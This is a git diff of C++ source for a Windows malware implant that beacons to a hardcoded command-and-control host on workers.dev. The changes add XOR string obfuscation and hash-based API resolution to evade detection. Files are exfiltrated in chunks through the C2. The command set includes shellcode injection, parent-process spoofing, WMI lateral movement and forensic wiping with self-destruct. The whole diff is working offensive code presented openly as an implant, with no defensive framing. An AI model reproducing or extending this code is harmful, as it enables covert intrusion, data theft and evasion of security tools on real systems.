@@ -15,6 +15,7 @@
 #include "utils.hpp"
 #include "evasion.hpp"
 #include "injection.hpp"
+#include "obfuscate.hpp"
 #include <windows.h>
 #include <winhttp.h>
 #include <tlhelp32.h>
@@ -26,20 +27,34 @@
 #include <algorithm>
 #include <fstream>
 
-#pragma comment(lib, "winhttp.lib")
-#pragma comment(lib, "dnsapi.lib")
+
 
 // =====================================================================
-//  CONFIG DEFINITIONS
+//  CONFIG DEFINITIONS — strings obfuscated with compile-time XOR
 // =====================================================================
 namespace config {
-    const wchar_t* BEACON_TOKEN = L"a29e179bcfe4ec04c224ce5cf3b4a7e51cc5ba51228c9093a4215ed5ffadc260";
-    const wchar_t* USER_AGENT   = L"Microsoft-WNS/10.0";
-    const uint16_t C2_PORT      = 443;
+    // Decrypted at runtime; never plaintext in binary
+    static wchar_t s_BeaconToken[65] = {};
+    static wchar_t s_UserAgent[32]   = {};
+    static bool    s_ConfigInit      = false;
+
+    static void EnsureInit() {
+        if (s_ConfigInit) return;
+        // XOR-decrypt at runtime into stack-local, then copy
+        auto tok = XSW(L"a29e179bcfe4ec04c224ce5cf3b4a7e51cc5ba51228c9093a4215ed5ffadc260");
+        auto ua  = XSW(L"Microsoft-WNS/10.0");
+        wcsncpy_s(s_BeaconToken, tok.str(), _TRUNCATE);
+        wcsncpy_s(s_UserAgent,   ua.str(),  _TRUNCATE);
+        s_ConfigInit = true;
+    }
+
+    const wchar_t* GetBeaconToken() { EnsureInit(); return s_BeaconToken; }
+    const wchar_t* GetUserAgent()   { EnsureInit(); return s_UserAgent;   }
+    const uint16_t C2_PORT = 443;
 }
 
-// C2 cloud exfil token (set via !token command or hardcoded for lab)
-static std::wstring g_ExfilToken;
+// Global session context for C2
+static std::wstring g_SessionId;
 // Hardware-derived AES key — computed once at startup
 static std::vector<BYTE> g_SessionKey;
 
@@ -118,14 +133,20 @@ static std::string JsonGetString(const std::string& json, const std::string& key
 }
 
 // =====================================================================
-//  WINHTTP TRANSPORT (RAII)
+//  WINHTTP TRANSPORT (RAII) — all APIs resolved by hash, no static import
 // =====================================================================
 struct WinHttpHandles {
     HINTERNET session = nullptr, connect = nullptr, request = nullptr;
     ~WinHttpHandles() {
-        if (request) WinHttpCloseHandle(request);
-        if (connect) WinHttpCloseHandle(connect);
-        if (session) WinHttpCloseHandle(session);
+        static auto hW = GetModuleHandleA(XS("winhttp.dll"));
+        if (!hW) hW = LoadLibraryA(XS("winhttp.dll"));
+        if (!hW) return;
+        auto _Close = HASHPROC(hW, WinHttpCloseHandle);
+        if (_Close) {
+            if (request) _Close(request);
+            if (connect) _Close(connect);
+            if (session) _Close(session);
+        }
     }
 };
 
@@ -137,59 +158,82 @@ static HttpResponse WinHttpRequest(
     const std::string& body, const std::wstring& extraHeaders = L"")
 {
     HttpResponse resp;
-    WinHttpHandles h;
 
-    h.session = WinHttpOpen(config::USER_AGENT,
-                            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-                            WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    // Load winhttp.dll and resolve all functions by hash — zero named imports
+    static HMODULE hW = nullptr;
+    if (!hW) hW = LoadLibraryA(XS("winhttp.dll"));
+    if (!hW) return resp;
+
+    auto _Open          = HASHPROC(hW, WinHttpOpen);
+    auto _Connect       = HASHPROC(hW, WinHttpConnect);
+    auto _OpenRequest   = HASHPROC(hW, WinHttpOpenRequest);
+    auto _SetOption     = HASHPROC(hW, WinHttpSetOption);
+    auto _AddHeaders    = HASHPROC(hW, WinHttpAddRequestHeaders);
+    auto _SendRequest   = HASHPROC(hW, WinHttpSendRequest);
+    auto _ReceiveResp   = HASHPROC(hW, WinHttpReceiveResponse);
+    auto _QueryHeaders  = HASHPROC(hW, WinHttpQueryHeaders);
+    auto _QueryAvail    = HASHPROC(hW, WinHttpQueryDataAvailable);
+    auto _ReadData      = HASHPROC(hW, WinHttpReadData);
+    auto _Close         = HASHPROC(hW, WinHttpCloseHandle);
+
+    if (!_Open || !_Connect || !_OpenRequest) return resp;
+
+    WinHttpHandles h;
+    h.session = _Open(config::GetUserAgent(),
+                      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                      WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!h.session) return resp;
 
     DWORD timeout = 20000;
-    WinHttpSetOption(h.session, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
-    WinHttpSetOption(h.session, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
-    WinHttpSetOption(h.session, WINHTTP_OPTION_SEND_TIMEOUT,    &timeout, sizeof(timeout));
+    if (_SetOption) {
+        _SetOption(h.session, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
+        _SetOption(h.session, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
+        _SetOption(h.session, WINHTTP_OPTION_SEND_TIMEOUT,    &timeout, sizeof(timeout));
+    }
 
-    h.connect = WinHttpConnect(h.session, host.c_str(), port, 0);
+    h.connect = _Connect(h.session, host.c_str(), port, 0);
     if (!h.connect) return resp;
 
-    h.request = WinHttpOpenRequest(
-        h.connect, verb.c_str(), path.c_str(), nullptr,
-        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+    h.request = _OpenRequest(h.connect, verb.c_str(), path.c_str(), nullptr,
+                             WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
+                             WINHTTP_FLAG_SECURE);
     if (!h.request) return resp;
 
-    // Accept lab/self-signed certs
     DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                   SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                   SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                   SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
-    WinHttpSetOption(h.request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
+    if (_SetOption) _SetOption(h.request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
 
-    std::wstring hdrs = L"Content-Type: application/json\r\nX-Beacon-Token: ";
-    hdrs += config::BEACON_TOKEN;
-    hdrs += L"\r\n";
+    // Header: Content-Type + beacon token — both strings are XOR-encrypted
+    auto ctHdr = XSW(L"Content-Type: application/json\r\nX-Beacon-Token: ");
+    std::wstring hdrs = std::wstring(ctHdr.str()) + config::GetBeaconToken() + L"\r\n";
     if (!extraHeaders.empty()) { hdrs += extraHeaders; hdrs += L"\r\n"; }
-    WinHttpAddRequestHeaders(h.request, hdrs.c_str(),
-                             static_cast<DWORD>(hdrs.size()), WINHTTP_ADDREQ_FLAG_ADD);
+    if (_AddHeaders)
+        _AddHeaders(h.request, hdrs.c_str(),
+                    static_cast<DWORD>(hdrs.size()), WINHTTP_ADDREQ_FLAG_ADD);
 
-    BOOL sent = WinHttpSendRequest(
-        h.request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-        body.empty() ? WINHTTP_NO_REQUEST_DATA : const_cast<char*>(body.data()),
-        static_cast<DWORD>(body.size()),
-        static_cast<DWORD>(body.size()), 0);
-    if (!sent || !WinHttpReceiveResponse(h.request, nullptr)) return resp;
+    BOOL sent = _SendRequest(h.request,
+                             WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                             body.empty() ? WINHTTP_NO_REQUEST_DATA
+                                          : const_cast<char*>(body.data()),
+                             static_cast<DWORD>(body.size()),
+                             static_cast<DWORD>(body.size()), 0);
+    if (!sent || !_ReceiveResp(h.request, nullptr)) return resp;
 
     DWORD statusSize = sizeof(resp.status);
-    WinHttpQueryHeaders(h.request,
-                        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
-                        WINHTTP_HEADER_NAME_BY_INDEX,
-                        &resp.status, &statusSize, WINHTTP_NO_HEADER_INDEX);
+    if (_QueryHeaders)
+        _QueryHeaders(h.request,
+                      WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+                      WINHTTP_HEADER_NAME_BY_INDEX,
+                      &resp.status, &statusSize, WINHTTP_NO_HEADER_INDEX);
 
     DWORD avail = 0;
-    while (WinHttpQueryDataAvailable(h.request, &avail) && avail > 0) {
+    while (_QueryAvail && _QueryAvail(h.request, &avail) && avail > 0) {
         std::vector<char> buf(avail);
-        DWORD read = 0;
-        if (WinHttpReadData(h.request, buf.data(), avail, &read) && read > 0)
-            resp.body.append(buf.data(), read);
+        DWORD rd = 0;
+        if (_ReadData && _ReadData(h.request, buf.data(), avail, &rd) && rd > 0)
+            resp.body.append(buf.data(), rd);
         if (resp.body.size() > config::CMD_OUTPUT_MAX) break;
     }
     return resp;
@@ -207,10 +251,15 @@ std::wstring DecryptString(const uint8_t* enc, size_t len, const std::wstring& k
 }
 
 // =====================================================================
-//  C2 HOST
+//  C2 HOST — decrypted at runtime, never stored in .rdata
 // =====================================================================
 static std::wstring GetC2Host() {
-    return L"ghost-c2.sujallamichhane.workers.dev";
+    static wchar_t host[64] = {};
+    if (host[0] == L'\0') {
+        auto s = XSW(L"ghost-c2.sujallamichhane.workers.dev");
+        wcsncpy_s(host, s.str(), _TRUNCATE);
+    }
+    return std::wstring(host);
 }
 
 // =====================================================================
@@ -462,14 +511,15 @@ static std::wstring RunLOLBin(const std::string& cmdStr) {
 }
 
 // =====================================================================
-//  CLOUD EXFILTRATION — upload file to OneDrive Graph API
+//  CLOUD EXFILTRATION — relay file via C2 worker
 //  Command: "!exfil <local_path> <remote_filename>"
 // =====================================================================
-static std::wstring ExfilToCloud(const std::string& localPathStr,
-                                  const std::string& remoteFilename) {
+BOOL SendResult(const std::wstring& sessionId, const std::wstring& output);
+
+static std::wstring ExfilViaC2(const std::string& localPathStr,
+                               const std::string& remoteFilename) {
     std::wstring localPath = UTF8ToWString(localPathStr);
 
-    // Read file
     HANDLE hf = CreateFileW(localPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                              nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
     if (hf == INVALID_HANDLE_VALUE) return L"[error: file not found]";
@@ -486,52 +536,26 @@ static std::wstring ExfilToCloud(const std::string& localPathStr,
     ReadFile(hf, fileData.data(), static_cast<DWORD>(fileData.size()), &rd, nullptr);
     CloseHandle(hf);
 
-    if (g_ExfilToken.empty()) return L"[error: no exfil token — use !token to set]";
+    size_t chunkSize = 48 * 1024;
+    size_t totalChunks = (fileData.size() + chunkSize - 1) / chunkSize;
+    
+    size_t offset = 0;
+    size_t chunkIdx = 1;
+    
+    while (offset < fileData.size()) {
+        size_t len = std::min(chunkSize, fileData.size() - offset);
+        std::string b64 = Base64Encode(fileData.data() + offset, len);
+        
+        std::ostringstream ss;
+        ss << "EXFIL:" << remoteFilename << ":chunk" << chunkIdx << "/" << totalChunks << ":" << b64;
+        
+        SendResult(g_SessionId, UTF8ToWString(ss.str()));
+        
+        offset += len;
+        chunkIdx++;
+    }
 
-    // PUT to OneDrive: PUT /me/drive/root:/<filename>:/content
-    std::wstring remotePath = L"/v1.0/me/drive/root:/" +
-                               UTF8ToWString(remoteFilename) + L":/content";
-    std::wstring authHeader = L"Authorization: Bearer " + g_ExfilToken;
-
-    // Upload as raw binary (not JSON)
-    WinHttpHandles h;
-    h.session = WinHttpOpen(config::USER_AGENT,
-                            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-                            WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!h.session) return L"[error: WinHttpOpen]";
-
-    h.connect = WinHttpConnect(h.session, L"graph.microsoft.com", 443, 0);
-    if (!h.connect) return L"[error: WinHttpConnect]";
-
-    h.request = WinHttpOpenRequest(h.connect, L"PUT", remotePath.c_str(),
-                                   nullptr, WINHTTP_NO_REFERER,
-                                   WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
-    if (!h.request) return L"[error: WinHttpOpenRequest]";
-
-    std::wstring hdrs = authHeader + L"\r\nContent-Type: application/octet-stream\r\n";
-    WinHttpAddRequestHeaders(h.request, hdrs.c_str(),
-                             static_cast<DWORD>(hdrs.size()), WINHTTP_ADDREQ_FLAG_ADD);
-
-    BOOL sent = WinHttpSendRequest(h.request,
-                                   WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-                                   fileData.data(),
-                                   static_cast<DWORD>(fileData.size()),
-                                   static_cast<DWORD>(fileData.size()), 0);
-    if (!sent || !WinHttpReceiveResponse(h.request, nullptr))
-        return L"[error: upload request failed]";
-
-    DWORD status = 0, statusSz = sizeof(status);
-    WinHttpQueryHeaders(h.request,
-                        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
-                        WINHTTP_HEADER_NAME_BY_INDEX, &status, &statusSz,
-                        WINHTTP_NO_HEADER_INDEX);
-
-    if (status == 200 || status == 201)
-        return L"[*] Exfil success → " + UTF8ToWString(remoteFilename);
-
-    std::wostringstream ss;
-    ss << L"[error: HTTP " << status << L"]";
-    return ss.str();
+    return L"[*] Exfil success → " + UTF8ToWString(remoteFilename) + L" (" + std::to_wstring(totalChunks) + L" chunks)";
 }
 
 // =====================================================================
@@ -578,13 +602,21 @@ static std::string DnsQueryCommand(const std::wstring& sessionId) {
         if (sidHex.size() > 60) { sidHex = sidHex.substr(0, 60); break; }
     }
 
-    std::wstring dnsName = L"poll." + UTF8ToWString(sidHex) +
-                           L".ghost-c2.sujallamichhane.workers.dev";
+    auto c2Suffix = XSW(L".ghost-c2.sujallamichhane.workers.dev");
+    std::wstring dnsName = L"poll." + UTF8ToWString(sidHex) + c2Suffix.str();
+
+    auto hDns = GetModuleHandleA(XS("dnsapi.dll"));
+    if (!hDns) hDns = LoadLibraryA(XS("dnsapi.dll"));
+    if (!hDns) return {};
+
+    auto _DnsQuery_W = HASHPROC(hDns, DnsQuery_W);
+    auto _DnsFree = HASHPROC(hDns, DnsFree);
+    if (!_DnsQuery_W || !_DnsFree) return {};
 
     PDNS_RECORD pRecord = nullptr;
-    DNS_STATUS st = DnsQuery_W(dnsName.c_str(), DNS_TYPE_TEXT,
-                               DNS_QUERY_BYPASS_CACHE | DNS_QUERY_NO_HOSTS_FILE,
-                               nullptr, &pRecord, nullptr);
+    DNS_STATUS st = _DnsQuery_W(dnsName.c_str(), DNS_TYPE_TEXT,
+                                DNS_QUERY_BYPASS_CACHE | DNS_QUERY_NO_HOSTS_FILE,
+                                nullptr, &pRecord, nullptr);
     if (st != 0 || !pRecord) return {};
 
     std::string result;
@@ -598,7 +630,7 @@ static std::string DnsQueryCommand(const std::wstring& sessionId) {
         }
         rec = rec->pNext;
     }
-    DnsFree(pRecord, DnsFreeRecordList);
+    _DnsFree(pRecord, DnsFreeRecordList);
 
     if (result.empty()) return {};
 
@@ -631,120 +663,139 @@ static std::string BuildBeaconJson(const Session& s) {
 }
 
 // =====================================================================
+//  COMMAND HANDLERS
+// =====================================================================
+static std::wstring HandleInject(const std::string& args) {
+    std::istringstream ss(args);
+    DWORD pid = 0; std::string b64;
+    ss >> pid >> b64;
+    if (!pid || b64.empty()) return L"[!] Usage: !inject <pid> <b64shellcode>";
+    std::vector<BYTE> sc = Base64Decode(b64);
+    if (sc.empty()) return L"[error: bad base64]";
+    return InjectRemoteProcess(pid, sc.data(), sc.size()) ?
+           L"[*] Injected into PID " + std::to_wstring(pid) :
+           L"[error: injection failed]";
+}
+
+static std::wstring HandleInjectApc(const std::string& args) {
+    std::istringstream ss(args);
+    DWORD pid = 0; std::string b64;
+    ss >> pid >> b64;
+    if (!pid || b64.empty()) return L"[!] Usage: !inject-apc <pid> <b64shellcode>";
+    std::vector<BYTE> sc = Base64Decode(b64);
+    if (sc.empty()) return L"[error: bad base64]";
+    return InjectViaApc(pid, sc.data(), sc.size()) ?
+           L"[*] APC Queued to PID " + std::to_wstring(pid) :
+           L"[error: APC injection failed]";
+}
+
+static std::wstring HandleMigrate(const std::string& args) {
+    std::istringstream ss(args);
+    DWORD pid = 0; std::string targetStr;
+    ss >> pid >> targetStr;
+    if (!pid) {
+        pid = FindBestSvchost();
+        if (!pid) return L"[error: no suitable svchost found]";
+    }
+    std::wstring target = targetStr.empty() ?
+        []() {
+            wchar_t self[MAX_PATH]; GetModuleFileNameW(nullptr, self, MAX_PATH);
+            return std::wstring(self);
+        }() : UTF8ToWString(targetStr);
+
+    return SpawnWithPPID(target.c_str(), pid) ?
+           L"[*] Migrated under PID " + std::to_wstring(pid) :
+           L"[error: migrate failed]";
+}
+
+static std::wstring HandleExfil(const std::string& args) {
+    std::istringstream ss(args);
+    std::string localPath, remoteName;
+    ss >> localPath >> remoteName;
+    if (localPath.empty() || remoteName.empty())
+        return L"[!] Usage: !exfil <local_path> <remote_filename>";
+    return ExfilViaC2(localPath, remoteName);
+}
+
+static std::wstring HandleWipe(const std::string& args) {
+    bool sd = (args.find("--self-destruct") != std::string::npos);
+    return WipeForensics(sd);
+}
+
+static std::wstring HandleLateral(const std::string& args) {
+    std::istringstream ss(args);
+    std::string host, user, pass;
+    ss >> host >> user >> pass;
+    return LateralWMI(host, user, pass);
+}
+
+static std::wstring HandleDownload(const std::string& args) {
+    std::wstring path = UTF8ToWString(args);
+    HANDLE hf = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ,
+                            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (hf == INVALID_HANDLE_VALUE) return L"[error: file not found]";
+    LARGE_INTEGER fsz = {};
+    GetFileSizeEx(hf, &fsz);
+    std::vector<BYTE> buf(static_cast<size_t>(
+        std::min(fsz.QuadPart, (LONGLONG)config::CMD_OUTPUT_MAX)));
+    DWORD rd = 0;
+    ReadFile(hf, buf.data(), static_cast<DWORD>(buf.size()), &rd, nullptr);
+    CloseHandle(hf);
+    std::string b64 = Base64Encode(buf.data(), rd);
+    return UTF8ToWString(b64);
+}
+
+static std::wstring HandleUpload(const std::string& args) {
+    std::istringstream ss(args);
+    std::string path, b64;
+    ss >> path >> b64;
+    std::vector<BYTE> data = Base64Decode(b64);
+    if (data.empty()) return L"[error: bad base64]";
+    HANDLE hf = CreateFileW(UTF8ToWString(path).c_str(), GENERIC_WRITE, 0,
+                            nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (hf == INVALID_HANDLE_VALUE) return L"[error: cannot write file]";
+    DWORD writ = 0;
+    WriteFile(hf, data.data(), static_cast<DWORD>(data.size()), &writ, nullptr);
+    CloseHandle(hf);
+    return L"[*] Wrote " + std::to_wstring(writ) + L" bytes.";
+}
+
+// =====================================================================
 //  COMMAND DISPATCHER — heart of the implant
 // =====================================================================
+struct CmdEntry {
+    const char* prefix;
+    bool        exactMatch;
+    std::wstring (*handler)(const std::string& args);
+};
+
+static const CmdEntry kCmdTable[] = {
+    { "!ps ",         false, [](const std::string& a) { return RunFilelessPS(a); } },
+    { "!lol ",        false, [](const std::string& a) { return RunLOLBin("!lol " + a); } },
+    { "!inject-apc ", false, HandleInjectApc },
+    { "!inject ",     false, HandleInject },
+    { "!migrate ",    false, HandleMigrate },
+    { "!exfil ",      false, HandleExfil },
+    { "!wipe",        false, HandleWipe },
+    { "!lateral ",    false, HandleLateral },
+    { "ps",           true,  [](const std::string&)   { return GetProcessList(); } },
+    { "download ",    false, HandleDownload },
+    { "upload ",      false, HandleUpload },
+    { "exit",         true,  nullptr },
+    { "sleep",        true,  nullptr }
+};
+
 std::wstring ExecuteCommand(const std::wstring& cmd) {
     std::string cmdStr = WStringToUTF8(cmd);
 
-    // ---- Fileless PowerShell: !ps <utf8-script-as-base64> ----
-    if (cmdStr.rfind("!ps ", 0) == 0) {
-        return RunFilelessPS(cmdStr.substr(4));
-    }
-
-    // ---- LOLBin direct execution: !lol <binary> <args> ----
-    if (cmdStr.rfind("!lol ", 0) == 0) {
-        return RunLOLBin(cmdStr);
-    }
-
-    // ---- Remote injection: !inject <pid> <b64-shellcode> ----
-    if (cmdStr.rfind("!inject ", 0) == 0) {
-        std::istringstream ss(cmdStr.substr(8));
-        DWORD pid = 0; std::string b64;
-        ss >> pid >> b64;
-        if (!pid || b64.empty()) return L"[!] Usage: !inject <pid> <b64shellcode>";
-        std::vector<BYTE> sc = Base64Decode(b64);
-        if (sc.empty()) return L"[error: bad base64]";
-        return InjectRemoteProcess(pid, sc.data(), sc.size()) ?
-               L"[*] Injected into PID " + std::to_wstring(pid) :
-               L"[error: injection failed]";
-    }
-
-    // ---- PPID-spoof migrate: !migrate <pid> <target.exe-path> ----
-    if (cmdStr.rfind("!migrate ", 0) == 0) {
-        std::istringstream ss(cmdStr.substr(9));
-        DWORD pid = 0; std::string targetStr;
-        ss >> pid >> targetStr;
-        if (!pid) {
-            pid = FindBestSvchost();
-            if (!pid) return L"[error: no suitable svchost found]";
+    for (const auto& entry : kCmdTable) {
+        if (entry.exactMatch) {
+            if (cmdStr == entry.prefix && entry.handler)
+                return entry.handler("");
+        } else {
+            if (cmdStr.rfind(entry.prefix, 0) == 0 && entry.handler)
+                return entry.handler(cmdStr.substr(strlen(entry.prefix)));
         }
-        std::wstring target = targetStr.empty() ?
-            []() {
-                wchar_t self[MAX_PATH]; GetModuleFileNameW(nullptr, self, MAX_PATH);
-                return std::wstring(self);
-            }() : UTF8ToWString(targetStr);
-
-        return SpawnWithPPID(target.c_str(), pid) ?
-               L"[*] Migrated under PID " + std::to_wstring(pid) :
-               L"[error: migrate failed]";
-    }
-
-    // ---- Cloud exfil: !exfil <local_path> <remote_name> ----
-    if (cmdStr.rfind("!exfil ", 0) == 0) {
-        std::istringstream ss(cmdStr.substr(7));
-        std::string localPath, remoteName;
-        ss >> localPath >> remoteName;
-        if (localPath.empty() || remoteName.empty())
-            return L"[!] Usage: !exfil <local_path> <remote_filename>";
-        return ExfilToCloud(localPath, remoteName);
-    }
-
-    // ---- Set exfil token: !token <bearer_token> ----
-    if (cmdStr.rfind("!token ", 0) == 0) {
-        g_ExfilToken = UTF8ToWString(cmdStr.substr(7));
-        return L"[*] Exfil token set.";
-    }
-
-    // ---- Anti-forensics: !wipe [--self-destruct] ----
-    if (cmdStr.rfind("!wipe", 0) == 0) {
-        bool sd = (cmdStr.find("--self-destruct") != std::string::npos);
-        return WipeForensics(sd);
-    }
-
-    // ---- WMI lateral movement: !lateral <host> [user pass] ----
-    if (cmdStr.rfind("!lateral ", 0) == 0) {
-        std::istringstream ss(cmdStr.substr(9));
-        std::string host, user, pass;
-        ss >> host >> user >> pass;
-        return LateralWMI(host, user, pass);
-    }
-
-    // ---- Process list: ps ----
-    if (cmdStr == "ps") {
-        return GetProcessList();
-    }
-
-    // ---- File download: download <path> ----
-    if (cmdStr.rfind("download ", 0) == 0) {
-        std::wstring path = UTF8ToWString(cmdStr.substr(9));
-        HANDLE hf = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ,
-                                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
-        if (hf == INVALID_HANDLE_VALUE) return L"[error: file not found]";
-        LARGE_INTEGER fsz = {};
-        GetFileSizeEx(hf, &fsz);
-        std::vector<BYTE> buf(static_cast<size_t>(
-            std::min(fsz.QuadPart, (LONGLONG)config::CMD_OUTPUT_MAX)));
-        DWORD rd = 0;
-        ReadFile(hf, buf.data(), static_cast<DWORD>(buf.size()), &rd, nullptr);
-        CloseHandle(hf);
-        std::string b64 = Base64Encode(buf.data(), rd);
-        return UTF8ToWString(b64);
-    }
-
-    // ---- File upload: upload <path> <b64data> ----
-    if (cmdStr.rfind("upload ", 0) == 0) {
-        std::istringstream ss(cmdStr.substr(7));
-        std::string path, b64;
-        ss >> path >> b64;
-        std::vector<BYTE> data = Base64Decode(b64);
-        if (data.empty()) return L"[error: bad base64]";
-        HANDLE hf = CreateFileW(UTF8ToWString(path).c_str(), GENERIC_WRITE, 0,
-                                nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
-        if (hf == INVALID_HANDLE_VALUE) return L"[error: cannot write file]";
-        DWORD writ = 0;
-        WriteFile(hf, data.data(), static_cast<DWORD>(data.size()), &writ, nullptr);
-        CloseHandle(hf);
-        return L"[*] Wrote " + std::to_wstring(writ) + L" bytes.";
     }
 
     // ---- Fallback: raw command via cmd.exe /C ----
@@ -755,14 +806,26 @@ std::wstring ExecuteCommand(const std::wstring& cmd) {
 // =====================================================================
 //  SEND BEACON — AES-GCM encrypted POST /beacon
 // =====================================================================
-BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
+BOOL SendBeacon(const Session& session, std::wstring& taskOut, bool isFirstBeacon) {
     taskOut = L"sleep";
     std::string plainBody = BuildBeaconJson(session);
 
-    // Encrypt with session key
-    std::string encBody = g_SessionKey.empty() ?
-        plainBody :
-        "{\"enc\":\"" + AesGcmEncrypt(g_SessionKey, plainBody) + "\"}";
+    std::string encBody;
+    std::string sid = JsonEscape(WStringToUTF8(session.sessionId));
+
+    if (g_SessionKey.empty()) {
+        encBody = plainBody;
+    } else {
+        std::string enc = AesGcmEncrypt(g_SessionKey, plainBody);
+        encBody = "{\"session\":\"" + sid + "\",\"enc\":\"" + enc + "\"";
+        
+        if (isFirstBeacon) {
+            std::vector<BYTE> psk(std::begin(config::PSK), std::end(config::PSK));
+            std::string keyEnc = AesGcmEncrypt(psk, std::string(reinterpret_cast<const char*>(g_SessionKey.data()), g_SessionKey.size()));
+            encBody += ",\"key\":\"" + keyEnc + "\"";
+        }
+        encBody += "}";
+    }
 
     std::wstring host = GetC2Host();
     HttpResponse resp = WinHttpRequest(host, config::C2_PORT,
@@ -800,7 +863,7 @@ BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {
 
     std::string encBody = g_SessionKey.empty() ?
         plainBody :
-        "{\"enc\":\"" + AesGcmEncrypt(g_SessionKey, plainBody) + "\"}";
+        "{\"session\":\"" + sid + "\",\"enc\":\"" + AesGcmEncrypt(g_SessionKey, plainBody) + "\"}";
 
     std::wstring host = GetC2Host();
     HttpResponse resp = WinHttpRequest(host, config::C2_PORT,
@@ -812,8 +875,8 @@ BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {
 //  MAIN BEACON LOOP
 // =====================================================================
 VOID BeaconLoop() {
-    // Derive hardware key once
-    g_SessionKey = DeriveHardwareKey();
+    // Generate an ephemeral random session key
+    g_SessionKey = GenerateSessionKey();
 
     Session session;
     session.hostname      = GetHostname();
@@ -824,6 +887,8 @@ VOID BeaconLoop() {
     session.etwPatched    = PatchETW();
     session.hwbpsCleared  = ClearHardwareBreakpoints();
     session.sessionId     = GetHostnameHash() + L"|" + session.username;
+    
+    g_SessionId = session.sessionId;
 
     DebugLog(L"Session: " + session.sessionId);
 
@@ -837,7 +902,7 @@ VOID BeaconLoop() {
         BOOL ok = FALSE;
 
         if (!dnsMode) {
-            ok = SendBeacon(session, task);
+            ok = SendBeacon(session, task, failures == 0);
         }
 
         if (!ok) {
